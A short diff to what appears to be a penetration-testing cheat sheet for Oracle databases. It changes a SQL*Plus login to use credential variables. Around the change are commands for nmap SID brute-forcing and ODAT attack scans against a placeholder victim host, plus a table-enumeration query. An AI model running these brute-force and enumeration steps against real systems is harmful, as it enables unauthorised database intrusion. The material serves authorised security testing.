@@ -10,8 +10,8 @@ sudo nmap -p1521 --script oracle-sid-brute $VICTIM_IP
 ./odat.py all -s $VICTIM_IP
 
 
-# Connect Using SQL*Plus
-sqlplus username/password@$VICTIM_IP/SID
+# Connect Using SQL*Plus (creds from the vault)
+sqlplus $USER/$PASS@$VICTIM_IP/SID
 
 # Enumerate Database Info
 select table_name from all_tables;
